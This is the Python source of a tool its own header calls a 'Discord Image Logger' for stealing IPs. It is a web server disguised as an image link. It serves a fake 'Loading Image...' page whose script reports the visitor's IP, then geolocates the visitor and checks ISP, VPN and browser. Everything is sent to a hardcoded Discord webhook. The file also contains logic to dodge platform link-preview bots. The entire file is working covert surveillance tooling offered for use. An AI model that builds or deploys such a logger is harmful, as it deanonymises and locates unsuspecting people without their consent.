# Discord Image Logger - Real IP Version
# By Dexty | https://github.com/xdexty0

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "Dexty"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1437431909297950831/hOR6sC5C0jZqrc19t0udy6CD02ujqAOVlyNAg07omPr8m9jTDKg_OHmPkxsIDU1XI-bS",
    "image": "https://images-ext-1.discordapp.net/external/k-1uR6-3cGW00FGnucvcAPj5DNCblMndZH6ubGISnQo/https/tinyjpg.com/images/social/website.jpg",
    "imageArgument": True,

    # CUSTOMIZATION #
    "username": "Image Logger",
    "color": 0x00FFFF,

    # OPTIONS #
    "crashBrowser": False,
    "accurateLocation": False,
    "message": {
        "doMessage": False,
        "message": "This browser has been pwned by Dexty's Image Logger. https://github.com/xdexty0/Discord-Image-Logger",
        "richMessage": True,
    },
    "vpnCheck": 1,
    "linkAlerts": True,
    "buggedImage": True,
    "antiBot": 1,

    # REDIRECTION #
    "redirect": {
        "redirect": False,
        "page": "https://your-link.here"
    },
}

blacklistedIPs = ("27", "104", "143", "164")

def botCheck(ip, useragent):
    if not useragent:
        return False
        
    useragent_lower = useragent.lower()
    
    if "discordbot" in useragent_lower:
        return "Discord"
    elif "telegrambot" in useragent_lower:
        return "Telegram"
    elif any(bot in useragent_lower for bot in ['bot', 'crawler', 'spider', 'scraper']):
        return "Other Bot"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False, is_bot = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot and not is_bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None
        return

    ping = "@everyone"

    try:
        info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
        if info["proxy"]:
            if config["vpnCheck"] == 2:
                    return
            
            if config["vpnCheck"] == 1:
                ping = ""
        
        if info["hosting"]:
            if config["antiBot"] == 4:
                if info["proxy"]:
                    pass
                else:
                    return

            if config["antiBot"] == 3:
                    return

            if config["antiBot"] == 2:
                if info["proxy"]:
                    pass
                else:
                    ping = ""

            if config["antiBot"] == 1:
                    ping = ""

        os, browser = httpagentparser.simple_detect(useragent) if useragent else ("Unknown", "Unknown")
    except:
        info = {}
        os, browser = "Unknown", "Unknown"
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info.get('isp', 'Unknown')}`
> **ASN:** `{info.get('as', 'Unknown')}`
> **Country:** `{info.get('country', 'Unknown')}`
> **Region:** `{info.get('regionName', 'Unknown')}`
> **City:** `{info.get('city', 'Unknown')}`
> **Coords:** `{str(info.get('lat', ''))+', '+str(info.get('lon', '')) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info.get('timezone', 'Unknown').split('/')[1].replace('_', ' ') if '/' in info.get('timezone', '') else info.get('timezone', 'Unknown')}`
> **Mobile:** `{info.get('mobile', 'Unknown')}`
> **VPN:** `{info.get('proxy', 'Unknown')}`
> **Bot:** `{info.get('hosting', 'Unknown') if info.get('hosting') and not info.get('proxy') else 'Possibly' if info.get('hosting') else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:** `{useragent}`
""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            client_ip = self.headers.get('x-forwarded-for') or self.client_address[0]
            user_agent = self.headers.get('user-agent', '')
            
            bot = botCheck(client_ip, user_agent)
            
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            # If it's a bot, serve the bugged image
            if bot:
                self.send_response(200 if config["buggedImage"] else 302)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url)
                self.end_headers()

                if config["buggedImage"]: 
                    self.wfile.write(binaries["loading"])

                makeReport(client_ip, endpoint = s.split("?")[0], url = url, is_bot=True)
                return
            
            # REAL USER - Use JavaScript to get real IP and redirect
            html_content = f'''
<!DOCTYPE html>
<html>
<head>
    <title>Loading...</title>
    <style>
        body {{
            margin: 0;
            padding: 0;
            background: #000;
            color: #fff;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }}
        .loader {{
            text-align: center;
        }}
    </style>
</head>
<body>
    <div class="loader">
        <h2>Loading Image...</h2>
        <p>Please wait while we load your content</p>
    </div>
    
    <script>
        // First, log the real IP before showing anything
        fetch('/log_real_ip?url={url}&ref=' + encodeURIComponent(document.referrer))
            .then(() => {{
                // After logging, show the actual image
                document.body.innerHTML = `
                    <style>
                        body {{
                            margin: 0;
                            padding: 0;
                        }}
                        div.img {{
                            background-image: url('{url}');
                            background-position: center center;
                            background-repeat: no-repeat;
                            background-size: contain;
                            width: 100vw;
                            height: 100vh;
                        }}
                    </style>
                    <div class="img"></div>
                `;
            }})
            .catch(err => {{
                console.error('Error:', err);
                // Still show image even if logging fails
                document.body.innerHTML = `
                    <style>
                        body {{
                            margin: 0;
                            padding: 0;
                        }}
                        div.img {{
                            background-image: url('{url}');
                            background-position: center center;
                            background-repeat: no-repeat;
                            background-size: contain;
                            width: 100vw;
                            height: 100vh;
                        }}
                    </style>
                    <div class="img"></div>
                `;
            }});
    </script>
</body>
</html>
'''
            
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(html_content.encode())
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(b'500 - Internal Server Error')
            reportError(traceback.format_exc())

    def do_GET(self):
        # Handle the real IP logging endpoint
        if self.path.startswith('/log_real_ip'):
            try:
                client_ip = self.headers.get('x-forwarded-for') or self.client_address[0]
                user_agent = self.headers.get('user-agent', '')
                referrer = self.headers.get('referer', '')
                
                # Parse query parameters
                query = parse.parse_qs(parse.urlsplit(self.path).query)
                url = query.get('url', [config["image"]])[0]
                ref = query.get('ref', [''])[0]
                
                # Log the REAL user IP (not Discord's proxy)
                makeReport(client_ip, user_agent, endpoint=self.path, url=url)
                
                self.send_response(200)
                self.send_header('Content-type', 'application/json')
                self.end_headers()
                self.wfile.write(b'{"status": "ok"}')
                return
            except Exception as e:
                self.send_response(500)
                self.send_header('Content-type', 'application/json')
                self.end_headers()
                self.wfile.write(b'{"status": "error"}')
                return
        else:
            self.handleRequest()

    do_POST = handleRequest

handler = app = ImageLoggerAPI
